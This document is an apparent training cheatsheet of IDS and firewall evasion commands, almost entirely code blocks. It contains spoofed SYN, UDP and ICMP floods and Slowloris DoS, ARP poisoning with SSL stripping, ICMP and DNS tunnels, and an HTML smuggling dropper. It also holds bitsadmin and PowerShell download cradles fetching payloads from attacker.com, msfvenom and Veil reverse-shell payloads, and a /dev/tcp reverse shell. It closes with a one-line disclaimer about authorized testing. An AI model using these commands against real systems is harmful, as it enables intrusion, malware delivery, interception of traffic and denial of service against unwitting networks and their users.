## 06 - Evading IDS/Firewalls Using Tools Cheatsheet

### Quick Reference Guide for IDS/Firewall Evasion Tools and Commands

---

## 1. IDS & Firewall Identification

### A. Port Scanning - Nmap

```bash
# Basic stealth scanning
nmap -sS target.com

# Stealth scan with timing control
nmap -sS -T2 target.com

# FIN scan to evade detection
nmap -sF target.com

# NULL scan
nmap -sN target.com

# Xmas scan
nmap -sX target.com

# Decoy scanning to hide source
nmap -D RND:10 target.com

# Fragmented packets
nmap -f target.com

# Custom fragment size
nmap --mtu 16 target.com
```

### B. Firewalking - Firewalk

```bash
# Basic firewalking
firewalk -S135-139,445 -i eth0 gateway_ip target_ip

# Advanced firewalking with specific ports
firewalk -S21,23,25,53,80,110,443 -i eth0 192.168.1.1 192.168.2.1

# Firewalking with verbose output
firewalk -v -S1-1024 -i eth0 gateway target
```

### C. Banner Grabbing - Netcat

```bash
# Basic banner grabbing
nc target.com 80

# Banner grabbing with timeout
timeout 5 nc target.com 22

# Multiple port banner grab
for port in 21 22 23 25 53 80 110 443; do echo "Port $port:"; timeout 3 nc target.com $port; done
```

---

## 2. IP Address Spoofing - Hping3

```bash
# Basic IP spoofing
hping3 -a spoofed_ip -S target.com -p 80

# Spoofed SYN flood
hping3 -a spoofed_ip -S -p 80 --flood target.com

# Random source IP spoofing
hping3 --rand-source -S target.com -p 80

# Spoof specific subnet
hping3 -a 192.168.1.100 -S target.com -p 443
```

---

## 3. Source Routing - Hping3

```bash
# Loose source routing
hping3 -G router1,router2,target -S -p 80 target.com

# Strict source routing  
hping3 -g router1,router2,router3,target -S -p 80 target.com

# Source routing with custom route
hping3 -G 192.168.1.1,10.0.0.1 -S target.com -p 443
```

---

## 4. Tiny Fragments - Fragroute

```bash
# Basic fragmentation
echo "ip_frag 8" | fragroute target.com

# Fragment with overlap
echo "ip_frag 8 ip_frag 16" | fragroute target.com

# Custom fragmentation size
echo "ip_frag 24" | fragroute target.com

# Fragment with delay
echo "ip_frag 8 delay 100" | fragroute target.com
```

### Alternative - Nmap Fragmentation

```bash
# Fragment packets
nmap -f target.com

# Custom MTU fragmentation
nmap --mtu 8 target.com

# Maximum fragmentation
nmap -ff target.com
```

---

## 5. Using IP Address in Place of URL - Curl/Wget

```bash
# Decimal IP notation
curl http://192.168.1.100/

# Hexadecimal IP notation  
curl http://0xC0A80164/

# Octal IP notation
curl http://0300.0250.0001.0144/

# Integer IP notation
curl http://3232235876/
```

---

## 6. Using Proxy Server - Proxychains

```bash
# Configure proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# Use with any tool
proxychains nmap -sT target.com

# Use with curl
proxychains curl http://target.com

# Dynamic proxy chain
proxychains4 -f /etc/proxychains.conf wget http://target.com
```

### Alternative - SSH SOCKS Proxy

```bash
# Create SOCKS proxy
ssh -D 8080 -N user@proxy_server

# Use proxy with tools
curl --socks5 127.0.0.1:8080 http://target.com
```

---

## 7. ICMP Tunneling - Ptunnel

```bash
# Server side (proxy)
ptunnel -p proxy_server

# Client side
ptunnel -p proxy_server -lp 8000 -da target_server -dp 22

# Authentication with password
ptunnel -p proxy_server -x password

# Verbose mode
ptunnel -v -p proxy_server -lp 2222 -da 192.168.1.100 -dp 80
```

### Alternative - Icmptunnel

```bash
# Server setup
./icmptunnel -s

# Client setup  
./icmptunnel proxy_ip

# Run with interface
./icmptunnel -d eth0 proxy_ip
```

---

## 8. ACK Tunneling - Hping3

```bash
# ACK tunnel probe
hping3 -A -p 80 target.com

# ACK scan on multiple ports
hping3 -A -p ++1 -c 1000 target.com

# ACK tunnel with data
hping3 -A -p 80 -d 120 target.com

# ACK tunnel with custom window size
hping3 -A -w 65535 -p 80 target.com
```

## HTTP Tunneling - HTTPTunnel

```bash
# Server side
hts --forward-port localhost:22 8888

# Client side
htc --forward-port 2222 proxy_server:8888

# Use the tunnel
ssh -p 2222 localhost
```

---

## 9. SSH Tunneling - OpenSSH

```bash
# Local port forwarding
ssh -L 8080:target_server:80 user@ssh_server

# Remote port forwarding
ssh -R 8080:localhost:22 user@ssh_server

# Dynamic SOCKS proxy
ssh -D 1080 user@ssh_server

# Background tunnel
ssh -f -N -D 1080 user@ssh_server
```

## DNS Tunneling - Dnscat2

```bash
# Server setup
ruby dnscat2.rb example.com

# Client connection
./dnscat2 example.com

# Encrypted connection
ruby dnscat2.rb --secret=password example.com

# Client with encryption
./dnscat2 --secret=password example.com
```

### Alternative - Iodine

```bash
# Server setup
iodined -f -c -P password 192.168.99.1 tunnel.example.com

# Client connection
iodine -f -P password tunnel.example.com

# Specify DNS server
iodine -f -P password -r dns_server tunnel.example.com
```

---

## 10. Through MITM Attack - Ettercap

```bash
# ARP poisoning
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# DNS spoofing
echo "*.target.com A 192.168.1.50" >> /etc/ettercap/etter.dns
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1//

# SSL stripping
ettercap -T -M arp:remote -P sslstrip /192.168.1.1//

# Full duplex ARP poisoning
ettercap -T -M arp /192.168.1.1// /192.168.1.100//
```

---

## 11. Through Content and XSS Attack - XSSer

```bash
# Basic XSS testing
xsser --url "http://target.com/search.php?q=XSS"

# POST method XSS
xsser --url "http://target.com/login.php" --data "user=admin&pass=XSS"

# Cookie stealing XSS
xsser --url "http://target.com/page.php?id=1" --cookie

# Advanced XSS with payloads
xsser --url "http://target.com/search.php?q=XSS" --payload "alert(1)"
```

---

## 12. Through HTML Smuggling - PowerShell

```powershell
# Basic HTML smuggling payload
$html = @"
<html><script>
var file = new Blob([atob('BASE64_ENCODED_EXE')], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(file);
a.download = 'file.exe';
a.click();
</script></html>
"@

$html | Out-File -FilePath "smuggle.html"
```

---

## 13. Through Windows BITS - Bitsadmin

```cmd
REM Create download job
bitsadmin /create evasion_job

REM Add file to job
bitsadmin /addfile evasion_job http://attacker.com/payload.exe C:\temp\payload.exe

REM Set priority
bitsadmin /setpriority evasion_job HIGH

REM Resume job
bitsadmin /resume evasion_job

REM Monitor progress
bitsadmin /info evasion_job

REM Complete job
bitsadmin /complete evasion_job
```

### Alternative - PowerShell BITS

```powershell
# Simple BITS download
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "C:\temp\file.exe"

# Background transfer with notification
Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\temp\payload.exe" -Asynchronous -DisplayName "System Update"
```

---

## 14. Session Splicing - Scapy

```python
# Session splicing example
from scapy.all import *

# Create fragmented HTTP request
packet1 = IP(dst="target.com")/TCP(dport=80)/"GET /ind"
packet2 = IP(dst="target.com")/TCP(dport=80)/"ex.html HTTP/1.1\r\n\r\n"

# Send fragments with delay
send(packet1)
time.sleep(0.1)
send(packet2)
```

---

## 15. Unicode Evasion - Custom Scripts

```python
# Unicode obfuscation
import urllib.parse

# Normal payload
payload = "<script>alert('XSS')</script>"

# Unicode encoded
unicode_payload = payload.encode('utf-16').decode('utf-16')
url_encoded = urllib.parse.quote(unicode_payload)

print(f"Unicode payload: {url_encoded}")
```

### PowerShell Unicode Bypass

```powershell
# Unicode encoded command
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute with Unicode encoding  
powershell -EncodedCommand $encoded
```

---

## 16. Time-to-Live Attack - Hping3

```bash
# TTL manipulation
hping3 -t 1 target.com

# Trace with specific TTL
hping3 -t 5 -c 1 target.com

# TTL evasion scan
for ttl in {1..10}; do hping3 -t $ttl -c 1 -S -p 80 target.com; done

# Low TTL fragmented packets
hping3 -t 2 -f target.com
```

---

## 17. Invalid RST Packet - Hping3

```bash
# Send RST with wrong sequence
hping3 -R -s 12345 -p 80 target.com

# RST flood with random sequence
hping3 -R --rand-source -p 80 --flood target.com

# Invalid RST with data
hping3 -R -d 100 -p 80 target.com

# RST with URG flag
hping3 -R -U -p 80 target.com
```

---

## 18. Polymorphic Shellcode - Metasploit

```bash
# Generate polymorphic payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o polymorphic.exe

# Multiple encoding iterations
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f elf -o encoded_shell

# Custom template with encoding
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x template.exe -k -e x86/shikata_ga_nai -i 3 -f exe -o final.exe
```

---

## 19. ASCII Shellcode - Metasploit

```bash
# Generate ASCII-only shellcode
msfvenom -p windows/exec CMD=calc.exe -e x86/alpha_mixed -f c

# Linux ASCII shellcode
msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f c

# Advanced ASCII encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/alpha_mixed BufferRegister=EAX -f raw
```

---

## 20. DoS Attack - Hping3

```bash
# SYN flood
hping3 -S --flood -V target.com

# UDP flood
hping3 --udp --flood target.com

# ICMP flood
hping3 --icmp --flood target.com

# Randomized source SYN flood
hping3 -S --flood --rand-source target.com
```

### Alternative - Slowloris

```bash
# Slowloris attack
slowloris target.com

# Custom parameters
slowloris -s 1000 -t 30 target.com

# HTTPS target
slowloris -p 443 --https target.com
```

---

## 21. False Positive Generation - Nmap

```bash
# Generate multiple false alerts
nmap -sS -O -A -T4 --script vuln target_range

# Trigger specific signatures
nmap --script http-sql-injection target.com

# Multiple vulnerability scans
nmap --script "exploit,vuln" target.com

# Generate noise with decoys
nmap -D RND:50 -sS target.com
```

---

## 22. Obfuscation - Veil Framework

```bash
# Start Veil
./Veil.py

# Generate obfuscated payload
use evasion/python/meterpreter/rev_tcp
set LHOST 192.168.1.100
set LPORT 4444
generate

# Use specific encoder
use evasion/cs/meterpreter/rev_tcp
set USE_ARYA Y
generate
```

---

## 23. Application Layer Attack - Burp Suite (Command Line)

```bash
# Burp Suite Professional command line
java -jar burpsuite_pro.jar --config-file=config.json

# Headless scanning
java -jar burpsuite_pro.jar --project-file=test.burp --headless

# Command line with extensions
java -jar burpsuite_pro.jar --load-extension=extension.jar
```

### Alternative - OWASP ZAP

```bash
# ZAP baseline scan
zap-baseline.py -t http://target.com

# Full scan
zap-full-scan.py -t http://target.com

# API scan
zap-api-scan.py -t http://target.com/api/openapi.json
```

---

## 24. Encryption - OpenSSL

```bash
# Encrypt payload
openssl enc -aes-256-cbc -in payload.exe -out payload.enc -k password

# Decrypt payload
openssl enc -d -aes-256-cbc -in payload.enc -out payload.exe -k password

# Base64 encoding
openssl base64 -in file.bin -out file.b64

# Generate encrypted reverse shell
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" | openssl enc -aes-256-cbc -a -salt -k password
```

---

## 25. Domain Generation Algorithm - Custom Python

```python
#!/usr/bin/env python3
import hashlib
import datetime

def generate_domains(count=100):
    seed = datetime.date.today().strftime("%Y%m%d")
    domains = []
    
    for i in range(count):
        data = f"{seed}-{i}".encode()
        hash_obj = hashlib.md5(data)
        domain = hash_obj.hexdigest()[:12] + ".com"
        domains.append(domain)
    
    return domains

# Generate today's domains
dga_domains = generate_domains()
for domain in dga_domains[:10]:  # Print first 10
    print(domain)
```

---

## 26. Flooding - Hping3

```bash
# TCP SYN flood
hping3 -S -p 80 --flood target.com

# UDP flood with random data
hping3 -2 --flood --rand-source target.com

# ICMP flood
hping3 -1 --flood target.com

# Connection flood (different ports)
hping3 -S -p ++1 --flood target.com
```

---

## Quick Command Reference

### Most Common Evasion Commands:

```bash
# Stealth scan
nmap -sS -f -D RND:10 target.com

# IP spoofing
hping3 -a fake_ip -S target.com -p 80

# Fragmentation
echo "ip_frag 8" | fragroute target.com

# ICMP tunnel
ptunnel -p proxy_server -lp 8000 -da target -dp 22

# SSH tunnel
ssh -D 1080 user@server

# DNS tunnel
./dnscat2 tunnel.domain.com

# Session splicing with delay
hping3 -S -p 80 -i u100000 target.com

# Unicode bypass
powershell -EncodedCommand <base64_unicode>

# Polymorphic payload
msfvenom -e x86/shikata_ga_nai -i 5 -f exe

# False positive generation
nmap --script vuln -D RND:20 target_range
```

---

**Note:** These commands are provided for educational purposes and authorized penetration testing only. Always ensure you have proper authorization before using these techniques on any network or system.
